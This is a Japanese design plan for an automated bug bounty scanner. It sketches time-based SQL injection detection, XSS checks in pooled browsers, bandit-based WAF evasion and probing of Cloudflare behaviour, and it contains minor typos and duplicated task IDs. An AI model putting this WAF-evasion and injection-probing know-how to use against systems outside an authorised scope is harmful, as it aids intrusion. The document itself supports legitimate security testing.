---
task_id: SGK-2026-0231
doc_type: plan
status: done
parent_task_id: SGK-2026-0025
related_docs:
  - docs/shigoku/plans/juice_shop_coverage_plan_2026-04-01.md
  - docs/shigoku/plans/bug_bounty_methodology_guide.md
created_at: '2026-05-22'
updated_at: '2026-07-02'
---

# Phase D: Bug Bounty継続的改善計画
## SmartHunter汎用チューニングと脆弱性検出最大化

## 1. 目的

Bug Bounty対象Webアプリケーション全体での脆弱性検出を最大化する継続的改善：
- **ROI最大化**: 高Impact・高報酬の脆弱性カテゴリを優先
- **検出率向上**: SmartHunter（SQLi/XSS/LFI/Command Injection）の汎用チューニング
- **網羅性確保**: OWASP Top 10 + Bug Bounty特有カテゴリの広域カバー
- **再現性保証**: 検出から報告までの信頼性向上

## 2. 現状分析

### 2.1 Bug Bounty脆弱性ROIランキング

| 順位 | 脆弱性カテゴリ | 平均報酬 | 発見難易度 | 優先度 |
|-----|---------------|---------|-----------|--------|
| 1 | SQL Injection | $3,000-15,000 | 中 | 🔴 P0 |
| 2 | SSRF | $2,500-10,000 | 中〜高 | 🔴 P0 |
| 3 | IDOR/Broken Access Control | $2,000-8,000 | 低〜中 | 🔴 P0 |
| 4 | Stored XSS | $1,500-6,000 | 中 | 🟠 P1 |
| 5 | Command Injection | $3,000-12,000 | 高 | 🟠 P1 |
| 6 | LFI/Path Traversal | $1,000-5,000 | 中 | 🟠 P1 |
| 7 | Reflected XSS | $500-3,000 | 低 | 🟡 P2 |
| 8 | JWT/Auth Bypass | $1,500-7,000 | 中 | 🟡 P2 |
| 9 | Open Redirect | $200-1,500 | 低 | 🟢 P3 |
| 10 | Information Disclosure | $300-2,000 | 低 | 🟢 P3 |

### 2.2 改善ポイント

1. **SmartHunter発動率**: 多くのターゲットでSpecialistが未呼び出し
2. **盲検・相関検出**: Time-based SQLi、OOBコマンドインジェクション未対応
3. **WAF/レート制限対策**: 実環境での検出効率低下
4. **深層検査**: バックアップ、ソースマップ、設定ファイル漏洩未実施
5. **認証連携**: セッション管理・自動再認証未整備

## 3. 統合実装計画（最終推奨統合版）

### 3.0 計画統合の原則（CTO最終評価反映 + 懸念点クリア）

本計画は、CTO最終評価に基づく改善案を統合し、**全ての懸念点に対する実装対策を盛り込んで**以下の優先順位で実装する：

**CTO懸念点と実装対策の概要（詳細は3.4.1）:**
| 懸念点 | 実装対策 | 対象タスク |
|-------|---------|-----------|
| result_hashのプロセス間変動 | SHA-256ハッシュ関数（`calculate_sha256_hash`） | D1-3 |
| WebSocket通知不通 | Email/Slackフォールバック通知（`notify_with_fallback`） | D1-4 |
| ペイロド変動ツールのべき等性 | ペイロド含むキー + 変動ツール検出 | D1-5 |
| 統合的手法閾値調整 | `CONSENSUS_THRESHOLDS`設定（外部化） | D2-1 |
| ベースライン環境変動 | 「同一セッション内」測定制約 | D2-1 |
| ブラウザメモリリーク | Browser Pool + 100件ごと再起動 | D2-2 |
| UCB1初期化（0除算） | ラプラススムージング | D2-3 |
| WAFデータ収集ブロック | スロットリング（5秒間隔） | D2-6 |
| 配列探索リクエスト爆発 | バイナリサーチ（100→7リクエスト） | D2-6 |
| スコープ境界自動判定 | HITL判断に委任（データ抽出は人間） | D3-2 |

**実装優先順位（技術的価値順）:**
1. **Priority 1 (MUST)**: Infrastructure Layer、Observability基盤、Resilience機構、SQLi Detection Engine（統合的手法）、HITL Strategy Pattern
2. **Priority 2 (SHOULD)**: OOB Correlation Engine、Proxy Integration、Generic Tool Adapter、XSS Detection Engine（Browser Pool）、Behavioral MockWAF
3. **Priority 3 (COULD)**: Second-Order Assistant、WAF Evasion（UCB1）、Param Discovery Engine、Evidence Collection Engine、Distributed SQLi Guesser、Bug Bounty Platform Integration
4. **Priority 4 (Ver.2/WON'T)**: ML Evasion（深層RL）、CI/CD Integration（Target Queue優先）、Optional JIRA

**統合された改善案:**
- **Time-based検出**: ノンパラメトリック検定（マンホイットニーU）+ Cliff's Delta + ベイズ推定 + アダプティブサンプリング
- **Checkpoint**: メタデータベース（外部ツール内部状態は保存せず、進捗のみ）+ IdempotentToolInvoker
- **Second-Order**: 人間支援型ハイブリッド（AIは候補特定・監視支援、人間が判断）
- **Distributed SQLi**: ヘッダー相関推定（確定は人間判断）
- **MockWAF**: 実測データベース + 定期更新（スロットリング付き）
- **WAF Evasion**: UCB1（ラプラススムージング）+ 深層RLはVer.2
- **Bug Bounty報告**: HackerOne/Bugcrowdプラットフォーム統合優先

### 3.1 Phase D-1: 基盤構築フェーズ（Week 1-2）- Priority 1

#### 3.1.1 ゴール
各スペシャリスト観点の「致命的問題」を防止する基盤インフラを構築（Testability基盤はPriority 3に移動）

#### 3.1.2 統合タスク一覧

| タスクID | タスク名 | 統合する観点 | 対応する致命的問題 | 工数 | 成果物 | 備考（改善案統合） |
|---------|---------|-------------|-------------------|------|--------|------------------|
| D1-1 | **Infrastructure Layer構築** | SRE, Architect | コネクションプール枯渇、Adapter密結合 | 8h | `Layer1Infrastructure`クラス、DIコンテナ基盤 | SemaphoreベースConnectionPool、Token Refresh Lock機制 |
| D1-2 | **Observability基盤実装** | SRE, Debugger | 可観測性不足、決定性欠如 | 6h | Prometheus Metrics、ExecutionTracer、シード付き乱数 | リングバッファ実装、seeded_random必須 |
| D1-3 | **Resilience機構実装** | SRE | WAFブロック後の自動回復なし、Checkpointなし | 6h | Circuit Breaker、**MetadataCheckpointManager** | メタデータのみ保存、外部ツール状態は保存しない |
| D1-4 | **HITL Strategy Pattern基盤** | Architect | HITLポイント増加の設計限界 | 4h | `HITLDecisionEngine`、Strategy登録機構 | WebSocket/Server-Sent Events通知機構 |
| D1-5 | **Idempotent Tool Invoker** | Architect | 外部ツール再実行のべき等性 | 4h | `IdempotentToolInvoker`、実行履歴管理 | Checkpoint連携で重複実行防止 |
| **合計** | | | | **28h** | |（D1-6 Testability基盤はPriority 3に移動）|

#### 3.1.3 タスク詳細

##### D1-1: Infrastructure Layer構築

```python
# 統合設計: SRE視点のリソース管理 + Architect視点のDIコンテナ
class InfrastructureLayer:
    """
    ┌─────────────────────────────────────────┐
    │  DI Container (Architect要求)           │
    │  - DiscoveryRegistry                      │
    │  - ToolAdapterRegistry                   │
    ├─────────────────────────────────────────┤
    │  Resource Manager (SRE要求)              │
    │  - ConnectionPool (FD管理、上限設定)      │
    │  - ProcessPool (CPU/メモリ制限)           │
    │  - DNSCache (TTL管理)                    │
    ├─────────────────────────────────────────┤
    │  Auth Manager (Architect要求)            │
    │  - TokenRefresh (自動更新)               │
    │  - Lock機制 (並行リフレッシュ防止)         │
    └─────────────────────────────────────────┘
    """
```

**受け入れ基準**:
- [ ] 100並列接続でFD枯渇しない（上限設定済み）
- [ ] 新Adapter追加時に既存コード改修不要（Registry経由）
- [ ] トークンリフレッシュ競合が発生しない（Lock機制動作確認）

##### D1-2: Observability基盤実装

```yaml
# 統合設計: SRE視点の監視 + Debugger視点の再現性
observability:
  metrics:  # SRE要求
    - payload_attempt_total
    - detection_latency_seconds
    - waf_block_rate
    - oob_callback_latency
  
  tracing:  # Debugger要求
    - trace_id_per_injection
    - execution_tracer (payload/response/timing記録)
    - replay_engine (ローカル再実行)
  
  determinism:  # Debugger要求
    - seeded_random (シード付き乱数)
    - network_emulator (遅延シミュレーション)
```

**受け入れ基準**:
- [ ] Prometheusメトリクスが取得できる
- [ ] 同じシードで同じペイロード順序が再現される
- [ ] 実行トレースからリプレイが可能

##### D1-3: Resilience機構実装（改善案: メタデータベースCheckpoint）

```python
# 統合設計: SRE視点の回復性 + Checkpoint改善案
class MetadataCheckpointManager:
    """
    外部ツールの内部状態ではなく、「進捗メタデータ」のみを保存
    """
    async def save_checkpoint(self, task: ScanTask) -> Checkpoint:
        checkpoint = {
            "task_id": task.id,
            "target_url": task.target.url,
            "scan_phase": task.current_phase,
            "param_progress": {
                "completed_params": [p.name for p in task.completed_params],
                "current_param": task.current_param.name if task.current_param else None,
                "pending_params": [p.name for p in task.pending_params],
            },
            "confirmed_findings": [f.to_dict() for f in task.findings if f.confirmed],
            "tool_invocations": [
                {
                    "tool": inv.tool_name,
                    "target": inv.target,
                    "param": inv.param,
                    "timestamp": inv.timestamp,
                    "result_hash": calculate_sha256_hash(inv.result)  # プロセス間で安定したハッシュ
                }
                for inv in task.tool_invocations
            ],
            "saved_at": datetime.utcnow().isoformat(),
            "elapsed_time": task.elapsed_time,
        }
        await self.redis.setex(f"checkpoint:{task.id}", ttl=3600*24*7, value=json.dumps(checkpoint))
        return Checkpoint(id=task.id, saved_at=checkpoint["saved_at"])

# SHA-256ハッシュ関数（プロセス間で安定）
def calculate_sha256_hash(result: ToolResult) -> str:
    """衝突確率1/2^64で16文字のハッシュを生成"""
    import hashlib
    import json
    return hashlib.sha256(
        json.dumps(result.to_dict(), sort_keys=True).encode()
    ).hexdigest()[:16]

class ResilienceManager:
    circuit_breaker:
        waf_block:
            threshold: 5
            recovery_timeout: 300s
            half_open_requests: 1
    
    checkpoint:
        save_interval: 60s
        storage: redis
        resume_on_restart: true
        # 重要: メタデータのみ保存、外部ツールは再実行
        metadata_only: true
```

**受け入れ基準**:
- [ ] 5回連続WAFブロックで自動的に回路遮断
- [ ] プロセス再起動後に進捗メタデータから復旧（外部ツールは再実行）
- [ ] チェックポイントにツール内部状態は含まれない（進捗のみ）
- [ ] 同一ツール呼び出しの重複実行が防止される（IdempotentToolInvoker連携）

##### D1-4: Generic Tool Adapter設計

```python
# 統合設計: Architect視点の拡張性
class SubprocessToolAdapter(ABC):
    """全FOSSツールの共通基底"""
    
    def __init__(self, config: ToolConfig):
        self.binary = config.binary
        self.default_args = config.default_args
        self.result_parser = config.parser
    
    async def scan(self, target: str, options: dict) -> Finding:
        # 共通: サブプロセス実行
        # 共通: タイムアウト制御
        # 共通: 結果JSONパース
        # 固有: ツール固有のパースのみconfigで指定
        pass

# YAML定義（ツール固有部分のみ）
# config/tools/sqlmap.yaml
name: sqlmap
binary: sqlmap
default_args: [--batch, --level=1]
parser: sqlmap_result_parser  # 関数参照
```

**受け入れ基準**:
- [ ] 新ツール追加時にYAMLのみの定義で動作
- [ ] 共通ロジック（タイムアウト、エラーハンドリング）が全ツールで共通化
- [ ] Adapterの単体テストが1つで全ツールの共通部分をカバー

##### D1-4: HITL Strategy Pattern基盤（改善案: 状態機械 + WebSocket通知）

```python
# 統合設計: Architect視点の拡張性 + HITL改善案
class HITLDecisionEngine:
    def __init__(self):
        self.strategies: Dict[str, HITLStrategy] = {}
        self.state_machine: HITLStateMachine = HITLStateMachine()
        self.notifier: WebSocketNotifier = WebSocketNotifier()
        self.fallback_notifiers: List[Notifier] = [EmailNotifier(), SlackNotifier()]  # フォールバック
    
    def register(self, scenario: str, strategy: HITLStrategy):
        self.strategies[scenario] = strategy
    
    async def route(self, finding: Finding) -> HITLDecision:
        # 状態遷移: PENDING → HUMAN_REVIEWING → CONFIRMED/REJECTED
        await self.state_machine.transition(finding.id, "PENDING", "HUMAN_REVIEWING")
        
        # 人間へのリアルタイム通知（WebSocket + フォールバック）
        notification_sent = await self.notify_with_fallback(finding)
        
        strategy = self.strategies.get(finding.scenario)
        decision = await strategy.decide(finding)
        
        await self.state_machine.transition(finding.id, "HUMAN_REVIEWING", 
                                           "CONFIRMED" if decision.confirmed else "REJECTED")
        return decision
    
    async def notify_with_fallback(self, finding: Finding) -> bool:
        """WebSocketが不通の場合、フォールバック通知を使用"""
        try:
            await self.notifier.notify(
                channel=f"finding:{finding.type}",
                message=f"HITL判定要求: {finding.type} on {finding.target}",
                payload=finding.to_dict(),
                timeout=5  # 5秒タイムアウト
            )
            return True
        except (WebSocketDisconnect, asyncio.TimeoutError):
            # WebSocket不通時はフォールバック通知
            for fallback in self.fallback_notifiers:
                try:
                    await fallback.notify(finding)
                    return True
                except Exception:
                    continue
            return False

# 新HITLポイント追加時
engine.register("waf_block", WAFEvasionStrategy())
engine.register("time_based_confirm", TimeBasedConfirmStrategy())
engine.register("second_order_hint", SecondOrderHumanAssistStrategy())  # Second-Order支援
# if/else追加不要
```

**受け入れ基準**:
- [ ] 新HITLポイント追加時にStrategyクラスのみの実装で済む
- [ ] WebSocket/Server-Sent Eventsで人間にリアルタイム通知
- [ ] HITL状態（PENDING→HUMAN_REVIEWING→CONFIRMED/REJECTED）を追跡
- [ ] HITL判定ロジックが100行を超えない

##### D1-5: Idempotent Tool Invoker（改善案: Checkpoint連携）

```python
# 統合設計: Checkpoint連携によるべき等性確保
class IdempotentToolInvoker:
    """
    べき等性を持つツール呼び出し（重複実行防止）
    注: 同一ペイロド生成を前提（sqlmap等のランダムOOBペイロドは別途対応）
    """
    def __init__(self, checkpoint_manager: MetadataCheckpointManager):
        self.checkpoint = checkpoint_manager
        self.invocation_cache: Dict[str, ToolResult] = {}
        self.payload_cache: Dict[str, str] = {}  # ペイロドキャッシュ
    
    async def invoke(self, tool: str, target: str, param: str, 
                     payload: Optional[str] = None) -> ToolResult:
        """
        ペイロドを含むキーで厳密なべき等性を確保
        sqlmap等、ペイロドが毎回変わるツールは別途対応が必要
        """
        # ペイロド含むキー（提供された場合）
        if payload:
            invocation_key = f"{tool}:{target}:{param}:{hash(payload)}"
        else:
            invocation_key = f"{tool}:{target}:{param}"
        
        # Checkpointで実行済みかチェック
        if invocation_key in self.checkpoint.completed_tool_invocations:
            logger.info(f"Skipping already executed: {invocation_key}")
            return ToolResult(skipped=True, reason="Already executed in previous session")
        
        # 新規実行
        result = await self.execute_tool(tool, target, param)
        
        # 実行履歴を記録（ペイロド変動ツールの場合は記録しない）
        if not self.is_payload_variable_tool(tool):
            await self.checkpoint.record_invocation(tool, target, param, result, payload)
        else:
            logger.warning(f"Tool {tool} has variable payloads - strict idempotency not guaranteed")
        
        return result
    
    def is_payload_variable_tool(self, tool: str) -> bool:
        """ペイロドが毎回変わるツール（sqlmapのOOB等）を検出"""
        variable_tools = {"sqlmap", "ghauri"}  # ランダムペイロド生成ツール
        return tool in variable_tools
```

**受け入れ基準**:
- [ ] 同一ツール呼び出し（ツール名+ターゲット+パラメータ）の重複実行が防止される
- [ ] Checkpoint復元後、実行済みツール呼び出しがスキップされる
- [ ] プロセス再起動後も実行履歴が保持される（Redis経由）

---

#### 3.1.3 Phase D-1 スキップ項目（Priority 3に移動）

| タスクID | タスク名 | 移動先 | 理由 |
|---------|---------|--------|------|
| D1-6 | **Testability基盤** | Phase D-3 | 機能開発優先、テスト基盤は後回し |
| D1-7 | **Behavioral MockWAF** | Phase D-2 | 実測データ収集後に実装 |

**注記**: Testability基盤は重要だが、Phase D-1ではInfrastructureとObservabilityの決定性（seeded_random）を優先。MockWAFは実測データベースでの実装をPhase D-2に統合。

#### 3.1.4 Phase D-1ステージゲート（改善案反映）

| 判定項目 | 基準 | 測定方法 | 通過条件 | 落ちた場合の対応 |
|---------|------|---------|---------|----------------|
| 基盤インフラ完成 | D1-1〜D1-5全て実装 | コードレビュー | 5タスク全完了 | 残タスクをWeek 3に持ち越し、Phase D-2縮小 |
| FD枯渇防止 | 100並列でFD<500 | 負荷テスト | FD枯渇なし | SemaphoreベースConnectionPoolに変更 |
| 再現性確保 | 同じシードで同じ結果 | 10回連続実行 | 10回中10回一致 | 全非決定要素（乱数、時刻、イテレーション順序）を特定 |
| Checkpoint動作 | メタデータ保存・復元 | プロセス再起動テスト | 進捗復元後、重複実行なし | MetadataCheckpointManager実装見直し |
| HITL通知 | WebSocket通知到達 | 通知テスト | 100%到達率 | WebSocketNotifier実装見直し |

---

### 3.2 Phase D-2: 検出エンジン実装フェーズ（Week 3-4）- Priority 1-2

#### 3.2.1 ゴール
Phase D-1の基盤上に、改善案を統合した検出エンジンを実装。Testability基盤とBehavioral MockWAFも本フェーズで実装。

#### 3.2.2 統合タスク一覧（改善案統合）

| タスクID | タスク名 | 統合する観点 | 対応する致命的問題 | 工数 | 成果物 | 備考（改善案統合） |
|---------|---------|-------------|-------------------|------|--------|------------------|
| D2-1 | **SQLi Detection Engine（統合的手法）** | Debugger, CTO | Time-based非決定性 | 12h | `RobustTimeBasedDetector` | マンホイットニーU検定 + Cliff's Delta + ベイズ推定 + アダプティブサンプリング |
| D2-2 | **XSS Detection Engine** | Architect, Debugger | DalFoxラップからの脱却 | 8h | `XSSDetectionEngine`、シード付きペイロード生成 | Browser Pool設計でパフォーマンス最適化 |
| D2-3 | **WAF Evasion Engine（UCB1）** | SRE, CTO | 自動回復なし、差別化要素 | 6h | `UCB1WAFEvasion` | ML（深層RL）はVer.2、Ver.1ではUCB1 |
| D2-4 | **OOB Correlation Engine** | SRE, Architect | OOBサーバーリソース圧迫 | 6h | `OOBCorrelationManager`、TTL管理、Provider Interface | DNS/HTTPコールバック相関管理 |
| D2-5 | **Generic Tool Adapter** | Architect | ツール追加時の_ADAPTER改修必須 | 6h | `SubprocessToolAdapter`基底クラス、YAML定義 | パーサーはPythonクラス継承で実装 |
| D2-6 | **Testability基盤 + Behavioral MockWAF** | Debugger | MockWAF現実性不足 | 8h | `BehavioralMockWAF`、`RealWAFBehaviorCollector` | 実測データベース、定期更新 |
| D2-7 | **Proxy Integration (Caido優先)** | Architect | Proxy連携未設計 | 6h | `ProxyIntegration`基底、Caido MCP連携 | 検出→再現フローの必須機能 |
| **合計** | | | | **52h** | | |

#### 3.2.3 タスク詳細（改善案統合版）

##### D2-1: SQLi Detection Engine（統合的手法）

```python
class RobustTimeBasedDetector:
    """
    複数の検定手法を組み合わせた頑健な検出（改善案統合）
    経騻的閾値調整: 5-10件のテストケースで閾値をチューニング
    """
    # 統合判断閾値（経騻的に調整可能）
    CONSENSUS_THRESHOLDS = {
        "mannwhitney_p": 0.05,      # 5%有意水準（標準的）
        "effect_size": 0.5,          # 中程度以上（Cliff's Delta基準）
        "posterior": 0.9,           # 90%事後確率（高信頼）
        "variance_ratio": 2.0,       # 分散2倍以上（経騻的）
        "consensus_required": 3,     # 4手法中3つ以上の合意（調整可能）
        "confidence_high": 0.95,     # 高信頼度閾値
        "confidence_medium": 0.7,    # 中信頼度閾値
    }
    
    def detect(self, baseline_samples: List[float], sleep_samples: List[float]) -> DetectionResult:
        # 重要: ベースラインは「同一セッション内」で測定（環境変動対策）
        
        # 手法1: ノンパラメトリック検定（分布フリー）
        from scipy.stats import mannwhitneyu
        u_stat, u_pvalue = mannwhitneyu(baseline_samples, sleep_samples, alternative='two-sided')
        
        # 手法2: 効果量（Cliff's Delta）
        effect_size = self.calculate_cliff_delta(baseline_samples, sleep_samples)
        
        # 手法3: ベイズ的事後確率（ガンマ分布仮定）
        posterior = self.bayesian_delay_inference(baseline_samples, sleep_samples)
        
        # 手法4: 分散比較
        variance_ratio = np.var(sleep_samples) / max(np.var(baseline_samples), 0.001)  # 0除算回避
        
        # 統合判断（閾値ベース）
        th = self.CONSENSUS_THRESHOLDS
        consensus_score = sum([
            u_pvalue < th["mannwhitney_p"],
            abs(effect_size) > th["effect_size"],  # 絶対値で比較
            posterior > th["posterior"],
            variance_ratio > th["variance_ratio"]
        ])
        
        return DetectionResult(
            is_vulnerable=consensus_score >= th["consensus_required"],
            confidence=consensus_score / 4,
            requires_human_review=(consensus_score < th["consensus_required"] and consensus_score >= 2),
            details={
                "mannwhitney_p": u_pvalue, 
                "effect_size": effect_size, 
                "posterior_prob": posterior, 
                "variance_ratio": variance_ratio,
                "consensus_score": consensus_score,
                "thresholds_applied": th  # 使用した閾値を記録（チューニング追跡用）
            }
        )
    
    def calculate_cliff_delta(self, baseline: List[float], sleep: List[float]) -> float:
        """
        Cliff's Delta: ノンパラメトリック効果量
        -0.147 < delta < 0.147: 無視できる差
        0.147 <= |delta| < 0.33: 小
        0.33 <= |delta| < 0.474: 中
        |delta| >= 0.474: 大
        """
        n1, n2 = len(baseline), len(sleep)
        dominance = 0
        for x in baseline:
            for y in sleep:
                if x < y:
                    dominance += 1
                elif x > y:
                    dominance -= 1
        return dominance / (n1 * n2)

class AdaptiveSamplingStrategy:
    """動的にサンプル数を調整（初期は少なく、不明確なら増やす）"""
    async def detect_with_adaptive_sampling(self, param: Param) -> DetectionResult:
        min_samples, max_samples = 5, 30
        current = min_samples
        
        while current <= max_samples:
            baseline = await self.collect_samples(param, "baseline", current)
            sleep = await self.collect_samples(param, "sleep(5)", current)
            result = self.detector.detect(baseline, sleep)
            
            if result.confidence > 0.95:
                return result
            elif result.confidence > 0.7:
                current = min(current + 5, max_samples)
            else:
                return DetectionResult(is_vulnerable=False, confidence=result.confidence)
        
        # max_samples達しても不明確ならHITL
        return DetectionResult(
            is_vulnerable=None, confidence=result.confidence,
            requires_human_review=True,
            reason="Insufficient statistical confidence after max sampling"
        )
```

##### D2-2: XSS Detection Engine（Browser Pool実装）

```python
class BrowserPool:
    """
    Chromiumブラウザのプール管理（起動オーバーヘッド削減）
    メモリリーク対策: 100件ごとにブラウザ再起動
    """
    def __init__(self, size: int = 5, max_requests_per_browser: int = 100):
        self.size = size
        self.max_requests = max_requests_per_browser
        self.pool = asyncio.Queue()
        self.request_counts = {}  # ブラウザごとのリクエスト数
        self._initialize_pool()
    
    def _initialize_pool(self):
        """初期ブラウザ起動"""
        for i in range(self.size):
            browser = self.launch_browser()
            self.pool.put_nowait(browser)
            self.request_counts[id(browser)] = 0
    
    async def acquire(self) -> Browser:
        """プールからブラウザ取得（自動再起動付き）"""
        browser = await asyncio.wait_for(self.pool.get(), timeout=30)
        
        # メモリリーク対策: リクエスト数チェック
        if self.request_counts[id(browser)] >= self.max_requests:
            logger.info("Restarting browser to prevent memory leak")
            await browser.close()
            browser = self.launch_browser()
            self.request_counts[id(browser)] = 0
        
        return browser
    
    async def release(self, browser: Browser):
        """ブラウザをプールに返却"""
        self.request_counts[id(browser)] += 1
        await self.pool.put(browser)
    
    def launch_browser(self) -> Browser:
        """Chromium起動（playwright使用）"""
        from playwright.async_api import async_playwright
        # --no-sandbox, --disable-dev-shm-usage等のオプションで安定化
        return playwright.chromium.launch(
            headless=True,
            args=["--no-sandbox", "--disable-dev-shm-usage", "--disable-gpu"]
        )

class XSSDetectionEngine:
    """Browser Poolを使用したDOM-based XSS検出"""
    def __init__(self):
        self.browser_pool = BrowserPool(size=5, max_requests_per_browser=100)
    
    async def detect_dom_xss(self, url: str, payload: str) -> XSSFinding:
        """プールからブラウザ取得→検出→返却"""
        browser = await self.browser_pool.acquire()
        try:
            page = await browser.new_page()
            await page.goto(url)
            
            # XSS検出ロジック
            result = await self.check_xss_execution(page, payload)
            
            await page.close()
            return result
        finally:
            await self.browser_pool.release(browser)
```

##### D2-3: WAF Evasion Engine（UCB1 - 改善案）

```python
class UCB1WAFEvasion:
    """
    深層強化学習ではなく、UCB1（Upper Confidence Bound）でシンプルに実装
    ラプラススムージングで0除算回避・探索促進
    Ver.2で深層RLを検討
    """
    EXPLORATION_CONSTANT = 2.0  # 探索パラメータ（標準的な値）
    
    def __init__(self):
        self.strategies: List[EvasionStrategy] = []
        self._initialize_with_laplace_smoothing()
    
    def _initialize_with_laplace_smoothing(self):
        """
        ラプラススムージング（Laplace Smoothing）:
        - trials=1で0除算回避
        - successes=1で楽観的初期化（探索を促進）
        """
        for strategy in self.strategies:
            strategy.trials = 1
            strategy.successes = 1  # 楽観的初期化
            strategy.success_rate = 1.0  # 初期値100%で未試行戦略を優遇
    
    def select_strategy(self, context: ScanContext) -> EvasionStrategy:
        # 各戦略の成功回数/試行回数に基づいて選択
        # UCB1: 成功確率 + 探索ボーナス（試行回数が少ないほど大きい）
        total_trials = sum(s.trials for s in self.strategies)
        
        return max(self.strategies, key=lambda s: 
            s.success_rate + math.sqrt(
                self.EXPLORATION_CONSTANT * math.log(total_trials) / s.trials
            )
        )
    
    def update_strategy_result(self, strategy: EvasionStrategy, success: bool):
        strategy.trials += 1
        if success:
            strategy.successes += 1
        strategy.success_rate = strategy.successes / strategy.trials
```

##### D2-6: Testability基盤 + Behavioral MockWAF（改善案統合）

```python
class ThrottledWAFBehaviorCollector:
    """
    スロットリング付きWAF挙動収集（WAFブロックリスク回避）
    収集頻度: 1日1回、リクエスト間隔: 5秒以上
    """
    def __init__(self):
        self.rate_limiter = asyncio.Semaphore(1)  # 直列実行
        self.min_interval = 5.0  # 秒
        self.last_request_time = 0
    
    async def collect_cloudflare_behavior(self, test_payloads: List[str]) -> WAFBehaviorProfile:
        behaviors = []
        for payload in test_payloads:
            async with self.rate_limiter:
                # インターバル確保
                elapsed = time.time() - self.last_request_time
                if elapsed < self.min_interval:
                    await asyncio.sleep(self.min_interval - elapsed)
                
                response = await self.send_through_cloudflare(payload)
                behaviors.append(WAFBehavior(
                    payload=payload,
                    blocked=response.status_code == 403 or "cf-ray" not in response.headers,
                    block_type=self.classify_block(response),
                    challenge_presented="cf-challenge" in response.text,
                    response_time=response.elapsed.total_seconds()
                ))
                self.last_request_time = time.time()
        return WAFBehaviorProfile(waf_type="cloudflare", behaviors=behaviors)

class BinarySearchParamDiscovery:
    """配列インデックス探索の効率化（バイナリサーチ）"""
    async def discover_array_indices(self, base_param: str, max_index: int = 100) -> List[int]:
        """
        バイナリサーチで有効な配列インデックスを発見
        100→50→25...と探索してリクエスト数を削減
        """
        valid_indices = []
        
        # バイナリサーチで上限を特定
        low, high = 0, max_index
        while low < high:
            mid = (low + high) // 2
            if await self.is_valid_index(base_param, mid):
                valid_indices.append(mid)
                low = mid + 1  # 上限を探索
            else:
                high = mid  # 下限を探索
        
        return valid_indices

class BehavioralMockWAF:
    """実測データに基づくMockWAF（スロットリング付き収集）"""
    def __init__(self, behavior_profile: WAFBehaviorProfile):
        self.profile = behavior_profile
        self.block_classifier = self.train_block_classifier(behavior_profile)
        self.collector = ThrottledWAFBehaviorCollector()
    
    async def periodic_update(self):
        """1日1回の低頻度で実測データを収集・更新"""
        while True:
            await asyncio.sleep(86400)  # 1日ごとに更新
            try:
                new_profile = await self.collector.collect()
                self.update_behavior_model(new_profile)
            except WAFBlockError:
                logger.warning("WAF blocked during data collection - skipping this cycle")
```

#### 3.2.4 Phase D-2ステージゲート（改善案反映）

| 判定項目 | 基準 | 測定方法 | 通過条件 | 落ちた場合の対応 |
|---------|------|---------|---------|----------------|
| 検出率向上 | SQLi 10%+、XSS 15%+ | DVWA/Juice Shop検証 | 目標達成 | エンジン調整継続、統合的手法パラメータ調整 |
| 統計的有意差合意率 | 4手法中3つ以上の合意 | テストデータ検証 | 合意率>90% | 検定手法見直し、閾値調整 |
| WAF回避成功 | Cloudflare/AWS WAF各1件突破 | 実環境テスト | 1件以上突破 | UCB1パラメータ調整、戦略追加 |
| OOB検出成功 | interactshで相関検出 | テスト環境 | 相関成功 | Provider Interface見直し |
| MockWAF現実性 | 実測データ10件以上収集 | 収集記録 | 10件以上 | データ収集継続、WAFパターン追加 |
| Proxy連携 | Caidoへの自動送信成功 | 統合テスト | 送信成功 | MCP連携見直し |

---

### 3.3 Phase D-3: 高度機能・統合フェーズ（Week 5-6）- Priority 3

#### 3.3.1 ゴール
CTO最終評価の改善案を統合し、Bug Bounty特化の高度機能を実装

#### 3.3.2 統合タスク一覧（改善案統合・優先度順）

| タスクID | タスク名 | 統合する観点 | 対応する致命的問題 | 工数 | 成果物 | 実装条件 |
|---------|---------|-------------|-------------------|------|--------|---------|
| D3-1 | **Second-Order Assistant（人間支援型）** | Architect | Second-Order検出不可能性 | 8h | `SecondOrderAssistant`、候補特定・監視支援 | Phase D-2検出率達成時のみ |
| D3-2 | **Evidence Collection Engine** | Architect | 証拠収集とレポート生成混在 | 6h | `EvidenceCollector`、Layer 4分離 | Phase D-2完了後 |
| D3-3 | **Distributed SQLi Guesser（推定検出）** | SRE | 分散SQLi検出不可 | 6h | `HeaderCorrelationDetector`、推定ベース | Phase D-3-1完了後 |
| D3-4 | **Bug Bounty Platform Integration** | CTO | プラットフォーム連携なし | 6h | `HackerOneAPI`、`BugcrowdAPI`連携 | Phase D-2完了後 |
| D3-5 | **Param Discovery Engine** | Architect | パラメータ発見の網羅性不足 | 6h | `AdvancedParamDiscovery`、プラグイン化 | Phase D-2完了後 |
| D3-6 | **Optional: ML Evasion（深層RL）** | CTO | 差別化要素 | 12h | `MLWAFStrategySelector` | UCB1成功率<30%の場合のみ |
| D3-7 | **Optional: Target Queue System** | Architect | CI/CD統合不可 | 8h | `TargetQueueSystem`、長時間実行管理 | 複数ターゲット運用時 |
| D3-8 | **Optional: JIRA Integration** | Architect | 社内チケット連携 | 4h | `JIRAProvider` | 社内管理必須時のみ |
| **合計（最小実装: D3-1〜D3-5）** | | | | **32h** | | |
| **合計（最大実装: 全て）** | | | | **56h** | | |

#### 3.3.3 段階的投資判断（改善案統合版）

```
Phase D-2完了時点での判断フロー:

検出率 >= 目標値 かつ WAF回避成功?
├── Yes → D3-1 (Second-Order Assistant) + D3-2 (Evidence) を実装
│         └── 成功時 → D3-3 (Distributed Guesser) + D3-4 (Platform Integration)
│
├── No（WAF回避のみ成功） → D3-4 (Platform Integration) のみ実装
│                          └── 検出率向上後にSecond-Orderを検討
│
└── No（両方未達） → Phase D-3凍結、Phase D-2エンジン調整継続

UCB1成功率 < 30% の場合のみ:
└── D3-6 (ML Evasion - 深層RL) を検討
    └── データ収集3ヶ月以上、1000エピソード以上が前提

複数ターゲット運用時:
└── D3-7 (Target Queue System) を実装
    └── CI/CD Integrationは見送り、キュー型運用を優先
```

#### 3.3.4 Phase D-3 タスク詳細（改善案統合版）

##### D3-1: Second-Order Assistant（人間支援型）

```python
class SecondOrderAssistant:
    """
    AIは「候補特定」と「監視」を支援、人間が「判断」と「手動検証」を実行
    """
    async def analyze_potential_second_order(self, finding: SQLiFinding) -> SecondOrderHint:
        # 保存系エンドポイントの特徴分析
        storage_indicators = self.analyze_storage_indicators(finding.endpoint)
        
        # 潜在的な表示系エンドポイントを探索
        potential_display_endpoints = await self.find_potential_display_endpoints(
